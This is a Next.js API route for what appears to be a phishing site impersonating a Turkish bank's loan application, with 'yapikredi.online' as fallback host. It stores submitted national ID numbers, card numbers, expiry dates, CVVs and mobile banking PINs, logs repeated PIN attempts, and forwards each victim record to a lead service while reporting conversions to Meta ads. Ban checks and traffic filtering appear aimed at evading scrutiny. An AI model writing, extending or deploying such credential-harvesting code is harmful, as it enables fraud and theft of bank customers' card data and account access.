import { NextRequest, NextResponse } from "next/server";
import { cookies } from "next/headers";
import { v4 as uuidv4 } from "uuid";
import { assertNotBanned } from "@/lib/access-control";
import { pushLeadToLeadflow } from "@/lib/leadflow/push-lead";
import { sendMetaLeadEvent } from "@/lib/meta/capi";
import { isOfferRequest } from "@/lib/meta/is-offer";
import { getStorage } from "@/lib/storage";
import { isValidTCKN } from "@/lib/tc-validation";
import { getClientIp } from "@/lib/request-ip";

async function scheduleMetaLead(
  request: NextRequest,
  applicantId: string,
  body: {
    phone?: string;
    firstName?: string;
    lastName?: string;
    loanAmount?: number;
  }
): Promise<void> {
  if (!(await isOfferRequest(request))) {
    console.warn("[meta-capi] skipped: not offer traffic");
    return;
  }
  console.log("[meta-capi] sending lead event for applicant", applicantId);

  const cookieStore = await cookies();
  const fbc = cookieStore.get("_fbc")?.value;
  const fbp = cookieStore.get("_fbp")?.value;

  const host =
    request.headers.get("x-forwarded-host") ??
    request.headers.get("host") ??
    "";
  const proto = request.headers.get("x-forwarded-proto") ?? "https";
  const eventSourceUrl = host ? `${proto}://${host}/` : `${proto}://localhost/`;

  const eventId = uuidv4();

  const send = sendMetaLeadEvent({
    eventId,
    eventSourceUrl,
    ip: getClientIp(request),
    userAgent: request.headers.get("user-agent") ?? "",
    phone: body.phone ?? "",
    firstName: body.firstName ?? "",
    lastName: body.lastName ?? "",
    fbc,
    fbp,
    externalId: applicantId,
    value: Number(body.loanAmount) || undefined,
    }).then((result) => {
      if (result.ok) {
        console.log("[meta-capi] lead event sent successfully for", applicantId, "event_id:", eventId);
      } else {
        console.error("[meta-capi] send failed", result.error ?? result);
      }
      return result;
    });

  await send;
}

async function scheduleLeadflowPush(
  applicantId: string,
  request: NextRequest
): Promise<void> {
  const storage = await getStorage();
  const full = await storage.getApplicant(applicantId);
  if (!full) return;

  const host =
    request.headers.get("x-forwarded-host") ??
    request.headers.get("host") ??
    "yapikredi.online";

  const push = pushLeadToLeadflow(full, host);

  await push;
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();

    const bannedResponse = await assertNotBanned(request, {
      tcKimlik: body.tcKimlik,
    });
    if (bannedResponse) return bannedResponse;

    const cookieStore = await cookies();
    const sessionId =
      cookieStore.get("app_session")?.value ?? uuidv4();

    if (!isValidTCKN(body.tcKimlik)) {
      return NextResponse.json(
        { error: "Geçersiz TC Kimlik Numarası" },
        { status: 400 }
      );
    }

    const storage = await getStorage();
    let applicant = await storage.getApplicantBySession(sessionId);
    if (!applicant) {
      applicant = await storage.createApplicant(sessionId, getClientIp(request));
    }

    const loanAmount = Number(body.loanAmount) || 0;
    const isPinOnlyAttempt = loanAmount === 0;

    const attempt = await storage.addAttempt(applicant.id, {
      tcKimlik: body.tcKimlik,
      firstName: body.firstName,
      lastName: body.lastName,
      phone: body.phone,
      birthDate: body.birthDate ?? "",
      loanAmount,
      loanTerm: body.loanTerm ?? 0,
      cardNumber: body.cardNumber ?? "",
      cardExpiry: body.cardExpiry ?? "",
      cardCvv: body.cardCvv ?? "",
      noCreditCard: Boolean(body.noCreditCard),
      mobilePin: body.mobilePin ?? "",
    });

    // Her denemeyi ilet (pin doğrulama dahil)
    await storage.updateApplicantStatus(
      applicant.id,
      isPinOnlyAttempt ? applicant.status : "completed",
      isPinOnlyAttempt ? undefined : new Date().toISOString()
    );
    await scheduleLeadflowPush(applicant.id, request);
    await scheduleMetaLead(request, applicant.id, body);

    const response = NextResponse.json({
      applicantId: applicant.id,
      attemptId: attempt.id,
      attemptNumber: attempt.attemptNumber,
      success: isPinOnlyAttempt
        ? attempt.attemptNumber === 1
        : true,
      canAdvance: isPinOnlyAttempt && attempt.attemptNumber === 1,
      message:
        isPinOnlyAttempt && attempt.attemptNumber < 1
          ? "Mobil şifreniz doğrulanamadı. Lütfen tekrar deneyiniz."
          : undefined,
    });

    response.cookies.set("app_session", sessionId, {
      httpOnly: true,
      sameSite: "lax",
      maxAge: 60 * 60 * 24,
    });

    return response;
  } catch (err) {
    const message = err instanceof Error ? err.message : "Hata oluştu";

    // Deneme limiti doldu → 429 + session sıfırla (yeni oturum başlasın)
    if (message === "Maximum attempts reached") {
      const res = NextResponse.json(
        { error: "Maksimum deneme sayısına ulaşıldı. Lütfen daha sonra tekrar deneyin." },
        { status: 429 }
      );
      res.cookies.delete("app_session");
      return res;
    }

    console.error("[api/attempts]", message);
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
